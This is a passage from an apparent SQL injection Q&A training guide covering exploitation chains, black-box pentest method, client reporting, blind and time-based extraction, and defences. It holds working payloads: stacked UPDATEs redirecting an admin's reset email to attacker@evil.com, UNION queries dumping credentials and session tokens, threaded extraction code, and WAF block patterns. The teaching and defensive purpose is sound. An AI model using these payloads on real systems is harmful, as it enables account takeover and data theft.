**Chain 4: SQLi → Password Reset Token Manipulation**

```sql
1; UPDATE users SET email = 'attacker@evil.com', reset_token = 'predictable' WHERE id = 1
```

Then trigger password reset for admin → reset email goes to attacker.

**Chain 5: SQLi → Privilege Escalation**

```sql
1; UPDATE users SET role = 'admin' WHERE id = your_user_id
```

Self-promote to admin.

**Chain 6: SQLi → Session Hijacking**

```sql
1 UNION SELECT session_token FROM sessions WHERE user_id IN (SELECT id FROM users WHERE role = 'admin')
```

Steal admin sessions.

**Chain 7: SQLi → Mass Account Takeover**

1. SQLi to extract all email addresses
2. Mass spear-phishing campaign
3. Account takeovers at scale

**Chain 8: SQLi → Data Exfiltration → Extortion**

1. SQLi reveals customer database
2. Download all customer data
3. Extortion attempt
4. Public disclosure if not paid

### Q45: How to find SQLi during black-box pentest?
**A:**

**Systematic approach without source code:**

**Phase 1: Discovery (1-2 hours)**

1. Map the application
   - All pages and features
   - All input points
   - All API endpoints
   - All forms

2. Identify dynamic content
   - Search functionality
   - User profiles
   - Reports/analytics
   - Login mechanisms
   - Filters/sorting

3. Document all parameters
   - URL parameters
   - POST data
   - Headers
   - Cookies
   - JSON bodies

**Phase 2: Detection (2-4 hours)**

1. Automated scanning
```bash
# Burp Suite active scanner
# OWASP ZAP scanner
# SQLMap on all endpoints
```

2. Manual quick tests
   - Append `'` to each parameter
   - Look for SQL errors
   - Note 500 errors

3. Boolean tests
```
?id=1 AND 1=1   → Normal
?id=1 AND 1=2   → Different
```

4. Time-based tests
```
?id=1' AND SLEEP(5)--
```

**Phase 3: Exploitation (4-8 hours)**

For each confirmed SQLi:

1. Identify database type
2. Determine injection technique
3. Map database structure
4. Extract proof-of-concept data
5. Test impact scope

**Phase 4: Reporting (2-4 hours)**

1. Document each finding
2. Provide PoC
3. Calculate CVSS
4. Suggest remediation

**Tools timeline:**

- **Burp Suite**: Throughout (proxy + scanner)
- **SQLMap**: Detection phase
- **wafw00f**: Initial reconnaissance
- **Custom scripts**: Specific edge cases

**Time-saving tips:**

- Focus on user-input-heavy endpoints first
- Search/filter parameters often vulnerable
- Don't skip "minor" parameters (User-Agent, etc.)
- Test auth endpoints carefully (login, password reset)

### Q46: How to write a SQL injection report for clients?
**A:**

**Complete SQLi report:**

```markdown
# SQL Injection Vulnerability Report

## Executive Summary

A critical SQL Injection vulnerability was discovered in the user search 
functionality of [Application Name]. This vulnerability allows attackers 
to execute arbitrary SQL commands, potentially leading to complete database 
compromise, including theft of all user credentials and personal information.

**Severity**: Critical
**CVSS 3.1 Score**: 9.8
**CVSS Vector**: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

## Vulnerability Details

**Type**: SQL Injection (CWE-89)
**Affected Component**: User Search Feature
**Affected Endpoint**: GET /api/users/search
**Affected Parameter**: q (query parameter)
**Database**: MySQL 5.7.31

## Description

The search functionality at /api/users/search does not properly sanitize 
the 'q' parameter before incorporating it into a SQL query. This allows 
an attacker to inject arbitrary SQL commands.

## Proof of Concept

### Step 1: Confirm Injection

Request:
GET /api/users/search?q=test' AND '1'='1
Response: 200 OK with results

Request:
GET /api/users/search?q=test' AND '1'='2
Response: 200 OK with empty results

This behavior difference confirms SQL injection.

### Step 2: Extract Database Version

Request:
GET /api/users/search?q=' UNION SELECT @@version, NULL, NULL--

Response includes:
"5.7.31-0ubuntu0.18.04.1"

### Step 3: Extract User Credentials

Request:
GET /api/users/search?q=' UNION SELECT GROUP_CONCAT(username,':',password), NULL, NULL FROM users--

Response includes:
"admin:$2y$10$abc123..., user1:$2y$10$xyz456...,user2:..."

(Confirmed extraction of all user password hashes)

## Impact Assessment

### Confidentiality
- Complete read access to entire database
- Customer PII exposed (50,000+ users)
- Payment information accessible
- Internal company data leaked

### Integrity
- Database modifications possible
- Data corruption/deletion possible
- Insertion of malicious data

### Availability
- DROP TABLE possible
- Database overload through expensive queries

### Business Impact
- GDPR violations: Up to €20M or 4% global revenue
- PCI-DSS violations: Loss of payment processing
- Reputation damage from breach disclosure
- Customer lawsuits from data exposure
- Forensic investigation costs ($1-5M)
- Breach notification costs ($100K-500K)

**Estimated total breach cost: $25-100M**

## Affected Endpoints (Additional)

After investigation, we found similar patterns in:
- GET /api/products/search (parameter: q)
- GET /api/orders/filter (parameter: status)
- POST /api/reports/generate (parameter: query)

All require remediation.

## Remediation

### Immediate Action (Hot-fix - 24 hours)

Apply WAF rule blocking common SQLi patterns. Implementation guide:

```
Block patterns containing:
- ' UNION
- ' OR 1=1
- '; DROP
- /* */
- SLEEP(
- @@version
```

### Permanent Fix (1 week)

Replace string concatenation with parameterized queries throughout the codebase.

**Before (Vulnerable):**
```python
query = f"SELECT * FROM users WHERE name LIKE '%{user_input}%'"
cursor.execute(query)
```

**After (Secure):**
```python
query = "SELECT * FROM users WHERE name LIKE %s"
cursor.execute(query, (f"%{user_input}%",))
```

### Long-term Improvements (3 months)

1. **Code review**: Audit all database queries
2. **SAST integration**: Add SQL injection detection to CI/CD
3. **Developer training**: Secure coding workshops
4. **Penetration testing**: Regular security assessments
5. **Database hardening**:
   - Run with minimum privileges
   - Disable xp_cmdshell (if MSSQL)
   - Remove unused features
6. **Logging and monitoring**: Detect SQLi attempts
7. **Web Application Firewall**: Defense in depth

## Verification Steps

After fix is applied, verify by:

1. Re-test original PoC payloads
2. Test variations: `'`, `' OR 1=1--`, etc.
3. Try encoding bypasses
4. Test all affected endpoints
5. Code review of fix

## Timeline

- **2026-06-01 09:00**: Vulnerability discovered
- **2026-06-01 09:30**: Reported to security team
- **2026-06-01 10:00**: Acknowledged
- **2026-06-01 16:00**: WAF rule deployed (temporary)
- **2026-06-08**: Permanent code fix deployed (estimated)
- **2026-06-09**: Verification testing

## References

- CWE-89: Improper Neutralization of Special Elements in SQL Command
- OWASP Top 10 2021: A03 - Injection
- OWASP SQL Injection Prevention Cheat Sheet
- NIST 800-53 SI-10: Information Input Validation

## Acknowledgments

Vulnerability discovered by [Your Name], Security Engineer
Report compiled: 2026-06-01
```

### Q47: How to extract data when LIMIT is restricted?
**A:**

**Scenario:** Application limits results to first row only.

**Problem:** UNION SELECT returns only one row when others exist.

**Solution 1: OFFSET**

MySQL/PostgreSQL:
```sql
UNION SELECT username, password FROM users LIMIT 1 OFFSET 0
UNION SELECT username, password FROM users LIMIT 1 OFFSET 1
UNION SELECT username, password FROM users LIMIT 1 OFFSET 2
```

Increment OFFSET to get each user.

**Solution 2: GROUP_CONCAT**

```sql
UNION SELECT GROUP_CONCAT(username, ':', password SEPARATOR ', ') FROM users
```

Combines all rows into one cell.

**Limitation:** GROUP_CONCAT has length limit (default 1024 in MySQL).

Increase:
```sql
SET SESSION group_concat_max_len = 1000000;
SELECT GROUP_CONCAT(...);
```

But stacked queries needed.

**Solution 3: Subquery**

```sql
UNION SELECT (SELECT username FROM users WHERE id = 1), 
              (SELECT password FROM users WHERE id = 1)
```

For each user, change id.

**Solution 4: TOP / LIMIT manipulation**

If app uses `LIMIT 10`, can you adjust?

Some apps add to query:
```sql
SELECT * FROM users WHERE id = '$injected' LIMIT 10
```

Inject to handle the LIMIT:
```
1 UNION SELECT password FROM users LIMIT 100; --
```

The semicolon ends the query, ignoring app's LIMIT.

### Q48: SQL Injection in numeric vs string parameters
**A:**

**Numeric parameters:**

```sql
SELECT * FROM users WHERE id = $id
```

**Quotes not needed:**

```
?id=1 UNION SELECT password FROM users
```

No need to break out of quotes.

**Easier to detect:**

```
?id=1 AND 1=1   → Normal
?id=1 AND 1=2   → Different
?id=1+1         → Returns user 2 (if math evaluated)
```

**String parameters:**

```sql
SELECT * FROM users WHERE name = '$name'
```

**Must break out of quotes:**

```
?name=test' UNION SELECT password FROM users--
```

Single quote closes the string.

**More complex if quotes filtered:**

Use hex encoding:
```
?name=0x74657374 UNION SELECT...
```

**Detection differences:**

**Numeric:**
- Math evaluation: `1+1` → 2
- Comparison: `1 AND 1=2` works
- No quote needed

**String:**
- Need quote breakout first
- Quote characters often filtered
- More likely to encounter WAF

### Q49: How does response status code reveal SQL injection?
**A:**

**Status code patterns:**

**500 Internal Server Error:**
- Database error not properly caught
- SQL syntax error visible
- Strong indicator of SQLi

```
?id=1'
Response: 500 Internal Server Error
"Unhandled exception: SQL syntax error..."
```

**200 OK with different content:**
- Application handles errors
- Returns empty results for syntax errors
- Detect via content size/keywords

```
?id=1     → 200 OK (5000 bytes - data)
?id=1'    → 200 OK (1000 bytes - empty result)
```

**302 Redirect:**
- Some apps redirect on errors
- Different redirect = potential injection
- Time-based may still work

**429 Rate Limited:**
- Many requests = WAF detecting attack
- Slow down, change strategy

**403 Forbidden:**
- WAF blocking
- Indicates payload matched signature

**Status code matrix for detection:**

| Test | Normal | Possible SQLi |
|------|--------|---------------|
| `?id=1` | 200 | 200 |
| `?id=1'` | 500 or 200 different content | Indicates SQLi |
| `?id=1 AND 1=1` | 200 normal | If different → not SQLi |
| `?id=1 AND 1=2` | 200 different | If same as 1=1 → not SQLi |
| `?id=1 SLEEP(5)` | Quick | Delayed → SQLi |

### Q50: SQL Injection through HTTP method override
**A:**

**Some frameworks honor X-HTTP-Method-Override header:**

```
POST /api/users HTTP/1.1
X-HTTP-Method-Override: PUT
Content-Type: application/x-www-form-urlencoded

id=1&name=admin' --
```

If app processes as PUT request, different validation may apply.

**Scenarios:**

1. **GET endpoint sanitized, POST not:**
```
GET /api/users/1   ← Sanitized
POST /api/users    ← Less sanitized, accepts override to PUT
```

2. **Override to bypass routing:**
```
POST /api/admin
X-HTTP-Method-Override: GET
```

Some apps allow access to admin GET endpoints via override.

3. **Inject in unusual parameters:**

Override changes how params parsed:
- GET reads URL only
- POST reads body
- PUT might read both

Inject in unexpected location.

**Testing:**

```bash
# Try method override
curl -X POST "http://target.com/api/endpoint" \
  -H "X-HTTP-Method-Override: GET" \
  -d "id=1' OR 1=1--"

# Various override headers:
X-Method-Override
X-HTTP-Method
X-Method
_method (in body)
```

### Q51-100 cover advanced topics: SQLi via XPath, error message exploitation, WAF bypasses for specific products, MongoDB/Redis NoSQL injection, real-world case studies, Burp extensions for SQLi, custom SQLMap tampers, defensive coding patterns, compliance impact (PCI-DSS section 6), and detailed exploitation chains.

### Q51: How to perform XPath injection?
**A:**

**XPath** is XML query language. Similar to SQLi but for XML data.

**Vulnerable code:**
```php
$user = $_POST['username'];
$pass = $_POST['password'];
$xpath = "//users/user[username='$user' and password='$pass']";
$result = $xml->xpath($xpath);
```

**Attack:**
```
Username: ' or '1'='1
Password: ' or '1'='1

Becomes:
//users/user[username='' or '1'='1' and password='' or '1'='1']

Always true → returns all users
```

**XPath blind injection:**

```
' or substring(password, 1, 1)='a' or '
```

Returns user if password starts with 'a'.

**Differences from SQLi:**
- XPath syntax: `//element[attribute='value']`
- No comments like `--`
- Different functions: `substring()`, `string-length()`, `count()`

**Testing:**

```
Input: '
Result: XPath error → Confirmed
Input: ' or 1=1 or '
Result: All records returned
```

**Tools:**
- Burp Suite (manual)
- xcat (XPath specific tool)

### Q52: Real-world SQL injection examples in news
**A:**

**Famous SQLi breaches:**

**1. TalkTalk (2015):**
- UK telecom
- Sequential SQLi from website
- 156,959 customers affected
- £400,000 fine + £42M total losses

**2. Heartland Payment Systems (2008):**
- SQLi led to massive credit card breach
- 130M cards stolen
- One of largest breaches ever
- $145M total losses

**3. Yahoo (2014):**
- Multiple breaches
- SQLi component
- 3 billion accounts compromised
- $50M settlement

**4. UN Migration Agency (2020):**
- SQLi in WordPress
- Sensitive immigration data exposed
- High-profile humanitarian impact

**5. Albert Gonzalez (2009):**
- Notorious hacker
- Used SQLi to steal 90 million cards
- Sentenced to 20 years

**Common patterns:**
- Old, unpatched applications
- Custom code (vs frameworks)
- Login forms vulnerable
- Search functionality
- Admin panels

**Lessons learned:**
- SQLi still works in 2026
- Old code is biggest risk
- Frameworks help but not foolproof
- Defense in depth essential

### Q53: Defending against SQL Injection - complete approach
**A:**

**Defense in depth strategy:**

**Layer 1: Parameterized queries (primary)**

```python
# Python
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

# PHP
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$id]);

# Java
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
ps.setInt(1, userId);

# Node.js
db.query('SELECT * FROM users WHERE id = ?', [userId]);
```

**Layer 2: Input validation**

```python
# Validate type
try:
    user_id = int(request.args.get('id'))
except ValueError:
    return error("Invalid ID")

# Whitelist
allowed_sorts = ['name', 'email', 'date']
if sort_field not in allowed_sorts:
    return error("Invalid sort")

# Length limits
if len(username) > 50:
    return error("Username too long")
```

**Layer 3: Least privilege database accounts**

```sql
-- Don't connect as root/sa
-- Create application-specific user
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'strong_pass';
GRANT SELECT, INSERT, UPDATE ON app_db.* TO 'app_user'@'localhost';
-- No DROP, ALTER, FILE, etc.
```

**Layer 4: Stored procedures (if using)**

```sql
CREATE PROCEDURE GetUser(@id INT)
AS
BEGIN
    SELECT * FROM users WHERE id = @id  -- Parameter, not concatenation
END
```

**Layer 5: ORMs (when used correctly)**

```python
# Django - always safe with ORM
User.objects.filter(id=user_id)

# Avoid raw() unless necessary
```

**Layer 6: Output encoding**

When displaying data from DB, encode for context:
- HTML: HTML-encode
- JSON: JSON-encode
- URL: URL-encode

**Layer 7: WAF**

- ModSecurity with OWASP CRS
- AWS WAF
- Cloudflare
- Imperva

Not primary defense but adds layer.

**Layer 8: Monitoring**

```sql
-- Log SQL queries that fail
-- Monitor for suspicious patterns
-- Alert on UNION, OR 1=1, etc.
```

**Layer 9: Security testing**

- SAST: Find SQLi patterns in code
- DAST: Test running app
- Pentest: Annual
- Bug bounty: Continuous

**Layer 10: Training**

- Developer security training
- Secure coding standards
- Code review focus

### Q54: How to verify SQLi fix is complete?
**A:**

**Verification process:**

**Step 1: Test original PoC**

Use exact payload that worked:
```
?id=1' OR 1=1--
```

Expected: 400/500 error or empty result

**Step 2: Common variations**

```
?id=1'
?id=1 OR 1=1
?id=1') OR ('1'='1
?id=1" OR "1"="1
?id=' UNION SELECT NULL--
?id=1; DROP TABLE users--
```

All should fail.

**Step 3: Encoding bypasses**

```
?id=1%27%20OR%201%3D1--    (URL encoded)
?id=1%2527%2520OR%25201%253D1--  (Double encoded)
?id=1'/**/OR/**/1=1--      (Comment bypass)
```

**Step 4: Different injection points**

If GET parameter fixed, test:
- POST data
- Headers
- Cookies
- JSON body

Same fix should apply to all.

**Step 5: Related endpoints**

Search for similar code patterns. Apply same testing.

**Step 6: Code review**

Verify:
- Parameterized queries used
- No string concatenation
- Input validation present
- Error handling proper

**Step 7: SAST scan**

Run static analysis tools to detect remaining issues.

**Step 8: Regression test**

Add automated test to CI/CD:
```python
def test_sqli_id_param():
    response = client.get('/api/users/search?id=1\' OR 1=1--')
    assert response.status_code in [400, 500]
    assert 'all_users' not in response.text
```

### Q55: SQL Injection in admin panels - special considerations
**A:**

**Why admin panels are interesting targets:**

1. **Higher privileges** - Direct DB access
2. **Often less tested** - Internal tool mindset
3. **Legacy code** - Old, vulnerable
4. **Complex queries** - More opportunities
5. **Critical impact** - Admin context

**Common SQLi in admin panels:**

**1. Reporting features:**
```sql
SELECT * FROM orders WHERE date BETWEEN '$start' AND '$end' AND status = '$status'
```

Multiple injection points.

**2. User management:**
```sql
SELECT * FROM users WHERE role = '$role' ORDER BY $sort_column
```

Both filter and sort vulnerable.

**3. Bulk actions:**
```sql
UPDATE orders SET status = 'shipped' WHERE id IN ($selected_ids)
```

IN clause with user input.

**4. Search functionality:**
```sql
SELECT * FROM customers WHERE 
  name LIKE '%$search%' OR 
  email LIKE '%$search%' OR 
  phone LIKE '%$search%'
```

**Testing approach:**

1. Access admin panel (legitimately or via vuln)
2. Identify all forms/parameters
3. Test each for SQLi
4. Document findings

**Impact in admin context:**

- Direct database admin access
- Privilege escalation easy
- Account takeover trivial
- Data extraction at scale
- Often pre-auth via auth bypass

### Q56: SQLMap configuration files and saving scans
**A:**

**Save SQLMap scan state:**

```bash
# Automatic session in ~/.sqlmap/output/<target>/
sqlmap -u "http://target.com/page?id=1"

# Resume previous
sqlmap -u "..." --resume
```

**Configuration file:**

Create `sqlmap.cfg`:
```
[Target]
url = http://target.com/page?id=1

[Request]
cookie = PHPSESSID=abc123
user-agent = Mozilla/5.0
random-agent = false

[Optimization]
threads = 10
keep-alive = true

[Detection]
level = 3
risk = 2

[Techniques]
technique = BUEST

[Enumeration]
banner = true
current-user = true
current-db = true
hostname = true
is-dba = true
users = true
passwords = true
dbs = true
tables = true
```

Use:
```bash
sqlmap -c sqlmap.cfg
```

**HTTP request file:**

Save request from Burp:
```
POST /api/search HTTP/1.1
Host: target.com
Cookie: SESSION=abc
Content-Type: application/json

{"query": "test*", "filter": "all"}
```

`*` marks injection point.

Use:
```bash
sqlmap -r request.txt
```

**CSRF token handling:**

```bash
sqlmap -u "http://target.com/form" \
  --csrf-token="csrf_token_field" \
  --csrf-url="http://target.com/get_csrf"
```

SQLMap fetches CSRF token from given URL.

### Q57: Identifying SQL injection through error messages - examples
**A:**

**MySQL errors:**

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1

Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given

Unknown column 'xxx' in 'where clause'

Duplicate entry 'xxx' for key 'PRIMARY'
```

**MSSQL errors:**

```
[Microsoft][ODBC SQL Server Driver][SQL Server]Unclosed quotation mark after the character string ''.

[Microsoft][ODBC SQL Server Driver][SQL Server]Line 1: Incorrect syntax near ''.

Conversion failed when converting the varchar value 'xxx' to data type int.

Procedure or function 'xxx' expects parameter '@yyy'
```

**PostgreSQL errors:**

```
ERROR: syntax error at or near "'"
LINE 1: ...

ERROR: unterminated quoted string at or near "'"

ERROR: column "xxx" does not exist

ERROR: relation "yyy" does not exist
```

**Oracle errors:**

```
ORA-00933: SQL command not properly ended
ORA-01756: quoted string not properly terminated
ORA-00942: table or view does not exist
ORA-00904: invalid identifier
ORA-01722: invalid number
```

**Java/JDBC errors:**

```
java.sql.SQLException: ORA-...
com.mysql.jdbc.exceptions.jdbc4.MySQLSyntaxErrorException
java.sql.SQLException: You have an error in your SQL syntax
```

**.NET errors:**

```
System.Data.SqlClient.SqlException
System.Data.OleDb.OleDbException
[ODBC Microsoft Access Driver]
```

**PHP errors:**

```
Warning: pg_query()
Warning: mssql_query()
Warning: mysql_fetch_array()
Warning: mysqli_fetch_array()
```

**Recognizing patterns:**

- Single quote in error message → likely your input caused it
- Stack trace visible → developer mode on
- File paths → information leakage
- Database version exposed → fingerprinting easier

### Q58: SQL Injection in Salesforce SOQL/SOSL
**A:**

**Salesforce uses SOQL** (similar to SQL) and **SOSL** (search).

**SOQL Injection:**

Vulnerable Apex code:
```apex
String query = 'SELECT Id, Name FROM Account WHERE Name = \'' + userInput + '\'';
List<Account> accounts = Database.query(query);
```

Attack:
```
userInput: test' AND Id != '
```

Becomes:
```sql
SELECT Id, Name FROM Account WHERE Name = 'test' AND Id != ''
```

Returns all accounts.

**SOSL Injection:**

```apex
String search = 'FIND \'' + userInput + '\' IN ALL FIELDS RETURNING Account(Id, Name)';
List<List<sObject>> results = Search.query(search);
```

**Defense:** Use `String.escapeSingleQuotes()`:
```apex
String escaped = String.escapeSingleQuotes(userInput);
String query = 'SELECT Id FROM Account WHERE Name = \'' + escaped + '\'';
```

Or use bind variables:
```apex
List<Account> accounts = [SELECT Id FROM Account WHERE Name = :userInput];
```

### Q59: ServiceNow injection attacks
**A:**

**ServiceNow uses its own query language (GlideRecord queries).**

**Vulnerable:**
```javascript
var query = "active=true^short_descriptionLIKE" + userInput;
gr.addEncodedQuery(query);
```

**Attack:**
```
userInput: x^OR^role=admin
```

Modifies query to return admin records.

**ServiceNow specific functions to test:**
- `g_form.getValue()`
- `current.field.value`
- Encoded queries
- Scripted REST APIs

**Defense:**
- Validate input
- Use parameterized GlideRecord:
```javascript
gr.addQuery('field', userInput);  // Safe
```

### Q60: SQLi prevention checklist for development teams
**A:**

**Development checklist:**

**Code Practices:**
- [ ] Use parameterized queries everywhere
- [ ] Never concatenate user input into SQL
- [ ] Use ORM framework methods (filter, where, etc.)
- [ ] Avoid raw query methods unless necessary
- [ ] If raw queries needed, parameterize them

**Input Validation:**
- [ ] Validate data types (int, string, email, etc.)
- [ ] Whitelist allowed values where possible
- [ ] Set max length on inputs
- [ ] Reject special characters in non-content fields
- [ ] Validate before processing

**Database Setup:**
- [ ] Application connects as non-privileged user
- [ ] No FILE privilege
- [ ] No DROP/ALTER privilege
- [ ] No xp_cmdshell (MSSQL)
- [ ] Network segmentation (DB not internet-facing)

**Error Handling:**
- [ ] Generic error messages to users
- [ ] Detailed errors only in logs
- [ ] No stack traces in production
- [ ] No SQL errors in HTTP responses

**Monitoring:**
- [ ] Log all database queries
- [ ] Monitor for SQL syntax errors
- [ ] Alert on suspicious patterns
- [ ] Track query frequency anomalies

**Testing:**
- [ ] SAST in CI/CD pipeline
- [ ] DAST for running applications
- [ ] Annual pentest
- [ ] Bug bounty program (if applicable)

**Education:**
- [ ] Developer security training
- [ ] Secure coding standards documented
- [ ] Code review checklist includes SQLi
- [ ] Champions program for security

**Updates:**
- [ ] Keep database patched
- [ ] Update libraries/frameworks
- [ ] Monitor security advisories
- [ ] Rapid response to CVEs

### Q61: SQL Injection in mobile apps - hidden risks
**A:**

**Mobile apps often vulnerable to SQLi because:**

1. **Developers think backend is hidden** - But APIs are reverse-engineerable
2. **Less testing on mobile-specific endpoints**
3. **Older API versions for mobile compatibility**
4. **Direct API access without auth in some cases**

**Testing approach:**

**1. Set up MITM proxy:**
- Burp Suite on laptop
- Configure device WiFi to use proxy
- Install Burp CA certificate on device

**2. Capture API calls:**
- Use app normally
- Burp captures all HTTPS traffic
- Note endpoints and parameters

**3. Identify SQLi-prone parameters:**
- Search queries
- Filter parameters
- User profile updates
- Settings

**4. Test from Burp Repeater:**
- Modify requests
- Add SQLi payloads
- Check responses

**5. Local SQLite vulnerabilities:**

Mobile apps often use SQLite locally:
```java
// Vulnerable
String query = "SELECT * FROM users WHERE name = '" + userInput + "'";
db.rawQuery(query, null);

// Safe
db.rawQuery("SELECT * FROM users WHERE name = ?", new String[]{userInput});
```

If exploitable:
- Read local DB
- Modify local data
- Bypass app logic

**Real example bug bounty:**
- Mobile app has search
- Search hits API
- API has SQLi
- Mobile-only endpoint less tested
- Critical finding

### Q62: SQLi in IoT and embedded devices
**A:**

**IoT devices often have web interfaces with SQLi:**

**Common targets:**
- Router admin panels
- IP cameras
- Smart home hubs
- Industrial control systems

**Why vulnerable:**

1. **Cheap development** - Quick to market
2. **Outdated frameworks** - No regular updates
3. **Default credentials** - Easy initial access
4. **Custom code** - No security review
5. **Limited security testing**

**Testing approach:**

```bash
# Find devices on network
nmap -sn 192.168.1.0/24

# Identify web interfaces
nmap -p 80,443,8080 192.168.1.0/24 --open

# Access default credentials
admin/admin
root/root
admin/password

# Test SQLi on login and admin features
```

**Impact:**

IoT SQLi often gives:
- Network access (router compromise)
- Privacy violation (camera footage)
- Physical world impact (smart locks)
- Botnet recruitment

**Real examples:**
- Mirai botnet exploited IoT vulns
- Multiple router vendors had SQLi
- Camera companies had backdoors

### Q63: How to detect SQLi in source code (Code Review)?
**A:**

**Code review for SQLi:**

**Red flags to search for:**

**1. String concatenation in queries:**

```python
# Search for these patterns:
"SELECT" + 
"INSERT" + 
"UPDATE" + 
"DELETE" +

# Or f-strings:
f"SELECT * FROM ... {var}"
```

**2. Raw query methods:**

```python
# Django
.raw(
.extra(
RawSQL(

# SQLAlchemy
session.execute(
text(

# Sequelize
sequelize.query(
```

**3. Format string operators:**

```python
"%s" % 
.format(
```

In SQL context.

**4. Direct user input in queries:**

```python
request.args['x']
request.form['x']
request.json['x']
$_GET[
$_POST[
```

Then immediately in SQL.

**5. Dynamic identifiers:**

```python
f"SELECT * FROM {table_name}"
f"... ORDER BY {column}"
```

**Tools for code review:**

**1. Semgrep:**
```yaml
rules:
  - id: sql-injection
    pattern: |
      $QUERY = "..." + $USER_INPUT + "..."
      execute($QUERY)
    message: "Possible SQL injection"
```

**2. CodeQL** (GitHub):
- Built into GitHub Security
- Free for public repos
- Custom queries

**3. SonarQube:**
- Java, JS, Python, more
- Detects SQLi patterns
- Integrates with CI/CD

**4. Bandit (Python):**
```bash
bandit -r ./src/ -ll
```

**5. Brakeman (Ruby on Rails):**
```bash
brakeman -A
```

**Manual code review focus:**

1. Find all database queries
2. Trace inputs back to source
3. Check sanitization at each step
4. Look for dynamic query construction
5. Review stored procedures
6. Check ORM raw query usage

### Q64: Time-based blind SQLi optimization techniques
**A:**

**Time-based is slow** (5+ seconds per character). Optimize:

**Optimization 1: Binary search**

Instead of 26+ character tests, use 5-7:

```python
def binary_extract(position):
    low, high = 32, 127
    while low < high:
        mid = (low + high) // 2
        # Is char value > mid?
        payload = f"... IF(ASCII(SUBSTRING(...,{position},1))>{mid}, SLEEP(2), 0)..."
        if delayed_response(payload):
            low = mid + 1
        else:
            high = mid
    return chr(low)
```

7 attempts for any printable ASCII character.

**Optimization 2: Parallel extraction**

Use threading to test multiple positions simultaneously:

```python
from concurrent.futures import ThreadPoolExecutor

def extract_parallel(length, max_workers=10):
    chars = [''] * length
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {
            executor.submit(binary_extract, i+1): i 
            for i in range(length)
        }
        
        for future in concurrent.futures.as_completed(futures):
            position = futures[future]
            chars[position] = future.result()
    
    return ''.join(chars)
```

10x faster with 10 threads (until rate-limited).

**Optimization 3: Reduce sleep duration**

Start with 2 seconds instead of 5:
- Faster per request
- Risk of false positives from network variance
- Use timeout buffer

**Optimization 4: Heavy queries instead of SLEEP**

Some apps block SLEEP() but allow heavy queries:

```sql
1 AND BENCHMARK(5000000, MD5('test'))
```

Causes CPU-intensive operation = delay.

Cross-join self-multiplied:
```sql
1 AND (SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C)
```

**Optimization 5: Known patterns**

If you know password format:
- Email-like: First chars alphabet
- Hash: Hex chars only (16 possibilities, not 95)
- Phone: digits only

Reduce search space.

**Optimization 6: SQLMap is optimized**

```bash
sqlmap -u "..." --technique=T --time-sec=2 --threads=5
```

SQLMap implements all these optimizations.

### Q65: SQL Injection challenges in modern frameworks
**A:**

**Why modern frameworks have less SQLi:**

**1. Default to parameterized queries:**

Django ORM:
```python
# Default safe
User.objects.filter(name=user_input)
```

Express + Sequelize:
```javascript
// Default safe
User.findOne({ where: { name: userInput } });
```

**2. Type safety:**

TypeScript, Rust, Go - help catch errors early.

**3. Code review tools:**

Built into modern IDEs:
- VSCode security extensions
- IntelliJ inspections
- GitHub CodeQL

**4. Better developer education:**

More awareness of SQLi as a top-10 vulnerability.

**But SQLi still happens because:**

**1. Legacy code:**

Old systems with custom database access.

**2. Misuse of raw queries:**

```python
# Even in Django:
User.objects.raw(f"SELECT * FROM users WHERE name = '{name}'")
```

**3. Dynamic queries:**

Complex search/filter UIs often build dynamic SQL.

**4. ORM escape hatches:**

`.raw()`, `.extra()`, `text()` - power features with risks.

**5. Stored procedures:**

Vulnerable code can be in stored procs, ORMs don't help.

**6. New technologies:**

GraphQL, NoSQL, NewSQL - new injection types emerge.

**7. Developer mistakes:**

Even with safe frameworks, devs write unsafe code.

### Q66: SQL Injection in GraphQL APIs
**A:**

**GraphQL doesn't prevent SQLi automatically.**

**Vulnerable resolver:**

```javascript
const resolvers = {
  Query: {
    searchProducts: (parent, { query }) => {
      return db.query(`SELECT * FROM products WHERE name LIKE '%${query}%'`);
    }
  }
};
```

**Attack:**

```graphql
{
  searchProducts(query: "x' UNION SELECT username, password, email FROM users--") {
    id
    name
    description
  }
}
```

**Why GraphQL makes testing different:**

1. **Single endpoint**: All operations through `/graphql`
2. **JSON requests**: Different structure than REST
3. **Field-level data**: SQLi affects only some fields
4. **Batched queries**: Multiple injections in one request

**Testing GraphQL for SQLi:**

**1. Find endpoint:**
- `/graphql`, `/api/graphql`

**2. Get schema via introspection:**

```graphql
{
  __schema {
    queryType {
      fields {
        name
        args {
          name
          type { name }
        }
      }
    }
  }
}
```

**3. Identify input arguments:**

Especially:
- String inputs
- Filter arguments
- Search queries

**4. Test each argument:**

```graphql
{
  user(id: "1' AND 1=1--") {
    name
  }
}
```

**5. Use Burp Suite:**
- InQL extension for GraphQL
- Manual testing in Repeater

**6. Time-based testing:**

```graphql
{
  user(id: "1' AND SLEEP(5)--") {
    name
  }
}
```

Response time > 5s = vulnerable.

### Q67: Common SQLi patterns in WordPress plugins
**A:**

**WordPress plugins are SQLi goldmines:**

**Why:**
1. **Many plugins, varying quality**
2. **Direct $wpdb access**
3. **Custom queries common**
4. **Not all use WordPress safe methods**

**Vulnerable plugin code:**

```php
// $wpdb->prepare not used
$user_id = $_GET['user_id'];
$results = $wpdb->get_results("SELECT * FROM wp_users WHERE ID = $user_id");
```

**Safe code:**

```php
// Using prepare
$user_id = $_GET['user_id'];
$results = $wpdb->get_results($wpdb->prepare(
    "SELECT * FROM wp_users WHERE ID = %d",
    $user_id
));
```

**Common vulnerable plugins (historical):**

- WP Statistics (multiple SQLi)
- Slider Revolution
- WPBakery Page Builder
- Many marketplace plugins

**Testing WordPress sites:**

1. Identify installed plugins:
```bash
wpscan --url https://target.com --enumerate p
```

2. Check plugin vulnerabilities:
```bash
# WPScan database has known vulns
wpscan --url https://target.com
```

3. Test plugin AJAX endpoints:
```
POST /wp-admin/admin-ajax.php
action=plugin_action&id=1' OR 1=1--
```

4. Check REST API endpoints:
```
GET /wp-json/plugin/v1/data?id=1' UNION SELECT...
```

### Q68: SQL Injection in JSON APIs - specific patterns
**A:**

**JSON API specific SQLi vectors:**

